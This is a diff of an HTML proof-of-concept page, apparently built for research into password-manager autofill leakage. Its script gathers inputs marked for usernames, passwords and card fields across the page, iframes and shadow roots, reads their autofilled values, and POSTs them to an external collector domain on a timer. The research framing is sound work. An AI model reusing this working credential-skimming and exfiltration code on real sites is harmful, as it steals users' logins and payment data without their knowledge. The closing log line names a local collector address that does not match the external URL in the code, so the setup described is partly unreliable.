-      if (!(ac.includes('username') || ac.includes('current-password') || ac.includes('new-password') || ac.includes('cc-'))) continue;
-      const val = inp.value || '';
-      if (!val) continue;
-      if (Date.now() - lastUserTypeAt < USER_TYPE_GRACE_MS) continue;
-      if (inp.dataset.exfiltrated === '1') continue;
-
-      const hidden = isHiddenEl(inp);
-      let rawTech = null;
-      if (inp.___in_iframe) {
-        const fr = inp.___in_iframe;
-        const card = fr.closest && fr.closest('.card');
-        rawTech = (card && card.dataset && card.dataset.tech) ? card.dataset.tech : 'iframe';
-      } else if (inp.___shadow_host) {
-        const host = inp.___shadow_host;
-        const card = host.closest && host.closest('.card');
-        rawTech = (card && card.dataset && card.dataset.tech) ? card.dataset.tech : 'shadow-dom';
-      } else {
-        const card = inp.closest && inp.closest('.card');
-        rawTech = (card && card.dataset && card.dataset.tech) ? card.dataset.tech : 'in-document';
+      // 3) known shadow-host elements (open mode)
+      const shadowHosts = Array.from(document.querySelectorAll('x-shadow-host'));
+      for (const host of shadowHosts) {
+        try {
+          const sr = host.shadowRoot;
+          if (!sr) continue;
+          const inputs = Array.from(sr.querySelectorAll('input[autocomplete]'));
+          inputs.forEach(inp => inp.___shadow_host = host);
+          collected.push(...inputs);
+        } catch (e) {
+          // ignore
+        }
       }
-      const tech = normalizeTechnique(rawTech);
 
-      results.push({
-        name: inp.name || inp.id || '?',
-        value: val,
-        hidden,
-        node: inp,
-        tech,
-        inputType: inp.type || null,
-        autocomplete: ac
-      });
-    } catch (e) {
-      // skip single input problems
+      return collected;
     }
-  }
-  return results;
-}
 
-/* --------------- Safe POST to local collector --------------- */
+    /* --------------- Autofill detection --------------- */
+    /* Returns list of { name, value, hidden, node, tech, inputType, autocomplete } */
+    function findAutofilledInputs() {
+      const inputs = collectAllInputs();
+      const results = [];
+      for (const inp of inputs) {
+        try {
+          const ac = (inp.getAttribute('autocomplete') || '').toLowerCase();
+          if (!(ac.includes('username') || ac.includes('current-password') || ac.includes('new-password') || ac.includes('cc-'))) continue;
+          const val = inp.value || '';
+          if (!val) continue;
+          if (Date.now() - lastUserTypeAt < USER_TYPE_GRACE_MS) continue;
+          if (inp.dataset.exfiltrated === '1') continue;
 
-async function safePostLocal(url, envelope) {
-  if (!url.startsWith('https://collector.aac-telemetry.org/')) {
-    log('Collector URL must be correct domain');
-    return { ok:false, status:'bad-url' };
-  }
+          const hidden = isHiddenEl(inp);
+          let rawTech = null;
+          if (inp.___in_iframe) {
+            const fr = inp.___in_iframe;
+            const card = fr.closest && fr.closest('.card');
+            rawTech = (card && card.dataset && card.dataset.tech) ? card.dataset.tech : 'iframe';
+          } else if (inp.___shadow_host) {
+            const host = inp.___shadow_host;
+            const card = host.closest && host.closest('.card');
+            rawTech = (card && card.dataset && card.dataset.tech) ? card.dataset.tech : 'shadow-dom';
+          } else {
+            const card = inp.closest && inp.closest('.card');
+            rawTech = (card && card.dataset && card.dataset.tech) ? card.dataset.tech : 'in-document';
+          }
+          const tech = normalizeTechnique(rawTech);
 
-  const bodyStr = JSON.stringify(envelope);
-  log('Sending payload: ' + bodyStr);
-  console.log('[poc-exfil] POST', url, envelope);
-  try {
-    const res = await fetch(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: bodyStr,
-      keepalive: true
+          results.push({
+            name: inp.name || inp.id || '?',
+            value: val,
+            hidden,
+            node: inp,
+            tech,
+            inputType: inp.type || null,
+            autocomplete: ac
+          });
+        } catch (e) {
+          // skip single input problems
+        }
+      }
+      return results;
+    }
+
+    /* --------------- Safe POST to local collector --------------- */
+
+    async function safePostLocal(url, envelope) {
+      if (!url.startsWith('https://collector.aac-telemetry.org/')) {
+        log('Collector URL must be correct domain');
+        return { ok: false, status: 'bad-url' };
+      }
+
+      const bodyStr = JSON.stringify(envelope);
+      log('Sending payload: ' + bodyStr);
+      console.log('[poc-exfil] POST', url, envelope);
+      try {
+        const res = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: bodyStr,
+          keepalive: true
+        });
+        const text = await res.text().catch(() => '');
+        if (!res.ok) {
+          log(`Collector returned non-2xx: ${res.status} ${res.statusText} ${text}`);
+          return { ok: false, status: res.status, text };
+        }
+        log('Collector OK: ' + (text || '(no body)'));
+        return { ok: true, status: res.status, text };
+      } catch (e) {
+        log('Send failed: ' + String(e));
+        return { ok: false, status: 'network-error', err: String(e) };
+      }
+    }
+
+    /* --------------- Value redaction helper --------------- */
+    /* Limit length to avoid huge payloads. */
+    function redactValue(v) {
+      if (v === undefined || v === null) return '';
+      const s = String(v);
+      return s.length > 200 ? s.slice(0, 200) : s;
+    }
+
+    /* --------------- Main exfiltrateOnce (builds schema) --------------- */
+    /* Produces payload object with fields aligned to your JSONL schema. */
+    async function exfiltrateOnce() {
+      const found = findAutofilledInputs();
+      if (!found || found.length === 0) { log('Scan: no autofilled inputs found'); return; }
+
+      // bump trial counter for this test id
+      window._POC_TRIALS[window.TEST_ID] = (window._POC_TRIALS[window.TEST_ID] || 0) + 1;
+      const trialNum = window._POC_TRIALS[window.TEST_ID];
+
+      const uaInfo = parseUserAgent();
+
+      for (const f of found) {
+        try { f.node.dataset.exfiltrated = '1'; } catch (e) { }
+
+        const now = new Date();
+        // local timestamp in Taipei for human reading
+        const local_ts = new Intl.DateTimeFormat('sv-SE', {
+          year: 'numeric', month: '2-digit', day: '2-digit',
+          hour: '2-digit', minute: '2-digit', second: '2-digit',
+          hour12: false, timeZone: 'Asia/Taipei'
+        }).format(now).replace('T', ' ');
+
+        // timestamp UTC (ISO8601, no ms)
+        const timestamp_utc = (new Date()).toISOString().replace(/\.\d+Z$/, 'Z');
+
+        // Infer injector type
+        const injected_by = (f.node && f.node.___in_iframe) ? 'iframe' :
+          (/cdn|thirdparty/i.test(f.tech) ? 'cdn-script' : 'static-html');
+
+        // Build schema-aligned payload
+        const payload = {
+          // time fields (server collector may overwrite timestamp_utc)
+          timestamp_utc,                  // e.g., "2025-10-28T10:26:09Z"
+          local_ts,                       // "2025-10-28 18:26:09"
+          test_id: window.TEST_ID,       // e.g., "exp_leakyautofill_20251028"
+          trial: trialNum,                // integer
+
+          // scenario choices: in-document / thirdparty-sameorigin / thirdparty-cdn / iframe
+          // We normalize based on data-tech and iframe flag.
+          scenario: f.node && f.node.___in_iframe ? 'iframe' :
+            (/cdn/.test(f.tech) ? 'thirdparty-cdn' :
+              (/sameorigin/.test(f.tech) ? 'thirdparty-sameorigin' : 'in-document')),
+
+          injected_by: injected_by,       // static-html / sameorigin-script / cdn-script / iframe
+          browser: uaInfo.browser,        // "Chrome"
+          browser_version: uaInfo.browser_version || null,
+          os: uaInfo.os || null,
+
+          password_manager: window.PWD_MANAGER || 'unknown', // optional place to set externally
+          pm_version: window.PWD_MANAGER_VERSION || null,
+
+          field_name: f.name || null,
+          input_type: f.inputType || null,
+          autocomplete_attr: f.autocomplete || null,
+          hidden: !!f.hidden,
+
+          // normalized visibility technique
+          visibility_technique: f.tech || null,
+          // dom selector for the input
+          dom_selector: simpleCssPath(f.node) || null,
+
+          // booleans
+          autofill_triggered: true,           // PoC-level detection
+          detected_by_poc: true,               // we detected and attempt to exfiltrate
+
+          // value handling: send plaintext value (so collector can hash) only if allowed
+          value: SEND_VALUE_SAMPLE ? redactValue(f.value) : null,
+          value_sample: SEND_VALUE_SAMPLE ? redactValue(f.value) : null,
+          // collector will compute value_hash (server-side) when value provided
+
+          exfil_method: 'fetch-post',
+          referrer: document.referrer || location.href,
+          csp: (document.querySelector('meta[http-equiv="Content-Security-Policy"]') ? document.querySelector('meta[http-equiv="Content-Security-Policy"]').getAttribute('content') : null) || null,
+          script_origin: location.origin,
+          iframe_origin: (f.node && f.node.___in_iframe && f.node.___in_iframe.src) ? (new URL(f.node.___in_iframe.src, location.href).origin) : null,
+
+          injection_time_ms: (typeof f._injection_timestamp === 'number') ? (Date.now() - f._injection_timestamp) : null,
+          user_interaction_required: false
+        };
+
+        // Wrap in envelope { payload: {...} } to match your collector's expected wrapper
+        const envelope = { payload };
+
+        log(`Found field ${payload.field_name} (hidden=${payload.hidden}, technique=${payload.visibility_technique}) — sending`);
+        await safePostLocal(LOCAL_COLLECTOR, envelope);
+      }
+    }
+
+    /* --------------- Scanning control --------------- */
+
+    let timer = null;
+    function startScanning(intervalMs) {
+      stopScanning();
+      timer = setInterval(() => { if (document.getElementById('enableExfil').checked) exfiltrateOnce(); }, intervalMs);
+      log(`Started scanning every ${intervalMs} ms`);
+    }
+    function stopScanning() {
+      if (timer) { clearInterval(timer); timer = null; log('Stopped scanning'); }
+    }
+
+    document.getElementById('enableExfil').addEventListener('change', (e) => {
+      if (e.target.checked) startScanning(parseInt(document.getElementById('intervalSel').value, 10));
+      else stopScanning();
     });
-    const text = await res.text().catch(()=> '');
-    if (!res.ok) {
-      log(`Collector returned non-2xx: ${res.status} ${res.statusText} ${text}`);
-      return { ok:false, status: res.status, text };
-    }
-    log('Collector OK: ' + (text || '(no body)'));
-    return { ok:true, status: res.status, text };
-  } catch (e) {
-    log('Send failed: ' + String(e));
-    return { ok:false, status:'network-error', err: String(e) };
-  }
-}
+    document.getElementById('intervalSel').addEventListener('change', (e) => {
+      if (document.getElementById('enableExfil').checked) startScanning(parseInt(e.target.value, 10));
+    });
+    document.getElementById('manualScan').addEventListener('click', () => exfiltrateOnce());
 
-/* --------------- Value redaction helper --------------- */
-/* Limit length to avoid huge payloads. */
-function redactValue(v) {
-  if (v === undefined || v === null) return '';
-  const s = String(v);
-  return s.length > 200 ? s.slice(0,200) : s;
-}
+    // stop scanning when page is hidden to avoid background exfil
+    document.addEventListener('visibilitychange', () => {
+      if (document.hidden) { log('Page hidden — pausing scanning'); stopScanning(); }
+    });
 
-/* --------------- Main exfiltrateOnce (builds schema) --------------- */
-/* Produces payload object with fields aligned to your JSONL schema. */
-async function exfiltrateOnce() {
-  const found = findAutofilledInputs();
-  if (!found || found.length === 0) { log('Scan: no autofilled inputs found'); return; }
-
-  // bump trial counter for this test id
-  window._POC_TRIALS[window.TEST_ID] = (window._POC_TRIALS[window.TEST_ID] || 0) + 1;
-  const trialNum = window._POC_TRIALS[window.TEST_ID];
-
-  const uaInfo = parseUserAgent();
-
-  for (const f of found) {
-    try { f.node.dataset.exfiltrated = '1'; } catch (e) {}
-
-    const now = new Date();
-    // local timestamp in Taipei for human reading
-    const local_ts = new Intl.DateTimeFormat('sv-SE', {
-      year:'numeric', month:'2-digit', day:'2-digit',
-      hour:'2-digit', minute:'2-digit', second:'2-digit',
-      hour12:false, timeZone:'Asia/Taipei'
-    }).format(now).replace('T',' ');
-
-    // timestamp UTC (ISO8601, no ms)
-    const timestamp_utc = (new Date()).toISOString().replace(/\.\d+Z$/,'Z');
-
-    // Infer injector type
-    const injected_by = (f.node && f.node.___in_iframe) ? 'iframe' :
-                        (/cdn|thirdparty/i.test(f.tech) ? 'cdn-script' : 'static-html');
-
-    // Build schema-aligned payload
-    const payload = {
-      // time fields (server collector may overwrite timestamp_utc)
-      timestamp_utc,                  // e.g., "2025-10-28T10:26:09Z"
-      local_ts,                       // "2025-10-28 18:26:09"
-      test_id: window.TEST_ID,       // e.g., "exp_leakyautofill_20251028"
-      trial: trialNum,                // integer
-
-      // scenario choices: in-document / thirdparty-sameorigin / thirdparty-cdn / iframe
-      // We normalize based on data-tech and iframe flag.
-      scenario: f.node && f.node.___in_iframe ? 'iframe' :
-                (/cdn/.test(f.tech) ? 'thirdparty-cdn' :
-                 (/sameorigin/.test(f.tech) ? 'thirdparty-sameorigin' : 'in-document')),
-
-      injected_by: injected_by,       // static-html / sameorigin-script / cdn-script / iframe
-      browser: uaInfo.browser,        // "Chrome"
-      browser_version: uaInfo.browser_version || null,
-      os: uaInfo.os || null,
-
-      password_manager: window.PWD_MANAGER || 'unknown', // optional place to set externally
-      pm_version: window.PWD_MANAGER_VERSION || null,
-
-      field_name: f.name || null,
-      input_type: f.inputType || null,
-      autocomplete_attr: f.autocomplete || null,
-      hidden: !!f.hidden,
-
-      // normalized visibility technique
-      visibility_technique: f.tech || null,
-      // dom selector for the input
-      dom_selector: simpleCssPath(f.node) || null,
-
-      // booleans
-      autofill_triggered: true,           // PoC-level detection
-      detected_by_poc: true,               // we detected and attempt to exfiltrate
-
-      // value handling: send plaintext value (so collector can hash) only if allowed
-      value: SEND_VALUE_SAMPLE ? redactValue(f.value) : null,
-      value_sample: SEND_VALUE_SAMPLE ? redactValue(f.value) : null,
-      // collector will compute value_hash (server-side) when value provided
-
-      exfil_method: 'fetch-post',
-      referrer: document.referrer || location.href,
-      csp: (document.querySelector('meta[http-equiv="Content-Security-Policy"]') ? document.querySelector('meta[http-equiv="Content-Security-Policy"]').getAttribute('content') : null) || null,
-      script_origin: location.origin,
-      iframe_origin: (f.node && f.node.___in_iframe && f.node.___in_iframe.src) ? (new URL(f.node.___in_iframe.src, location.href).origin) : null,
-
-      injection_time_ms: (typeof f._injection_timestamp === 'number') ? (Date.now() - f._injection_timestamp) : null,
-      user_interaction_required: false
-    };
-
-    // Wrap in envelope { payload: {...} } to match your collector's expected wrapper
-    const envelope = { payload };
-
-    log(`Found field ${payload.field_name} (hidden=${payload.hidden}, technique=${payload.visibility_technique}) — sending`);
-    await safePostLocal(LOCAL_COLLECTOR, envelope);
-  }
-}
-
-/* --------------- Scanning control --------------- */
-
-let timer = null;
-function startScanning(intervalMs) {
-  stopScanning();
-  timer = setInterval(() => { if (document.getElementById('enableExfil').checked) exfiltrateOnce(); }, intervalMs);
-  log(`Started scanning every ${intervalMs} ms`);
-}
-function stopScanning() {
-  if (timer) { clearInterval(timer); timer = null; log('Stopped scanning'); }
-}
-
-document.getElementById('enableExfil').addEventListener('change', (e) => {
-  if (e.target.checked) startScanning(parseInt(document.getElementById('intervalSel').value,10));
-  else stopScanning();
-});
-document.getElementById('intervalSel').addEventListener('change', (e) => {
-  if (document.getElementById('enableExfil').checked) startScanning(parseInt(e.target.value,10));
-});
-document.getElementById('manualScan').addEventListener('click', () => exfiltrateOnce());
-
-// stop scanning when page is hidden to avoid background exfil
-document.addEventListener('visibilitychange', () => {
-  if (document.hidden) { log('Page hidden — pausing scanning'); stopScanning(); }
-});
-
-log('PoC loaded — start the collector on 127.0.0.1:8088, then enable PoC exfiltration if desired.');
-</script>
+    log('PoC loaded — start the collector on 127.0.0.1:8088, then enable PoC exfiltration if desired.');
+  </script>
 </body>
+
 </html>
